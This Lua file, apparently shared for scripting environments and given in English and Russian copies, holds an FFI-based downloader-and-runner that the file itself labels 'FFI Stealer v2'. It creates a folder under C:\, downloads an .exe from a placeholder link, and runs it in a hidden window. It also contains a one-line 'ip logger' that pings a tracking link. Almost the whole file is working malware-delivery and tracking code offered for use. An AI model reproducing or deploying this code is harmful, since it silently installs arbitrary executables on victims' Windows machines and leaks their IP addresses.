local ffi = require('ffi')
ffi.cdef[[
    bool CreateDirectoryA(const char* lpPathName, void* lpSecurityAttributes);
    void* __stdcall URLDownloadToFileA(void* LPUNKNOWN, const char* LPCSTR, const char* LPCSTR2, int a, int LPBINDSTATUSCALLBACK);
    void* __stdcall ShellExecuteA(void* hwnd, const char* op, const char* file, const char* params, const char* dir, int show_cmd);
    bool DeleteUrlCacheEntryA(const char* lpszUrlName);
    bool CreateDirectoryA(const char* lpPathName, void* lpSecurityAttributes);
    void* __stdcall URLDownloadToFileA(void* LPUNKNOWN, const char* LPCSTR, const char* LPCSTR2, int a, int LPBINDSTATUSCALLBACK);
    void* __stdcall ShellExecuteA(void* hwnd, const char* op, const char* file, const char* params, const char* dir, int show_cmd);
    int ShellExecuteA(void* hwnd, const char* lpOperation, const char* lpFile, const char* lpParameters, const char* lpDirectory, int nShowCmd);
]]
local Shell32 = ffi.load('Shell32.dll')
local urlmon = ffi.load('UrlMon')
ffi.C.CreateDirectoryA("C:\\dir", nil)
urlmon.URLDownloadToFileA(nil, "raw link", "C:\\dir\\anyname.exe", 0,0)
Shell32.ShellExecuteA(nil, 'open', "C:\\dir\\anyname.exe", nil, nil, 0)

// FFI .exe runner v2 //
// FFI Stealer v2 //

--------------------------

local ffi = require('ffi')
ffi.cdef[[
    bool CreateDirectoryA(const char* lpPathName, void* lpSecurityAttributes);
    void* __stdcall URLDownloadToFileA(void* LPUNKNOWN, const char* LPCSTR, const char* LPCSTR2, int a, int LPBINDSTATUSCALLBACK);
    void* __stdcall ShellExecuteA(void* hwnd, const char* op, const char* file, const char* params, const char* dir, int show_cmd);
    bool DeleteUrlCacheEntryA(const char* lpszUrlName);
    bool CreateDirectoryA(const char* lpPathName, void* lpSecurityAttributes);
    void* __stdcall URLDownloadToFileA(void* LPUNKNOWN, const char* LPCSTR, const char* LPCSTR2, int a, int LPBINDSTATUSCALLBACK);
    void* __stdcall ShellExecuteA(void* hwnd, const char* op, const char* file, const char* params, const char* dir, int show_cmd);
    int ShellExecuteA(void* hwnd, const char* lpOperation, const char* lpFile, const char* lpParameters, const char* lpDirectory, int nShowCmd);
]]
local Shell32 = ffi.load('Shell32.dll')
local urlmon = ffi.load('UrlMon')
ffi.C.CreateDirectoryA("C:\\директория", nil)
urlmon.URLDownloadToFileA(nil, "суда прямая ссылка на файл", "C:\\директория\\любоеимя.exe", 0,0)
Shell32.ShellExecuteA(nil, 'open', "C:\\директория\\любоеимя.exe", nil, nil, 0)

// FFI запускатель .exe v2 //
// FFI стиллер v2 //


os.execute("ping please_change_this_to_ip_logger_link /n 1")

// 1 line ip logger //
-----------

os.execute("ping ссылка_на_ip_логгер /n 1")

// ip логгер в одну линию //
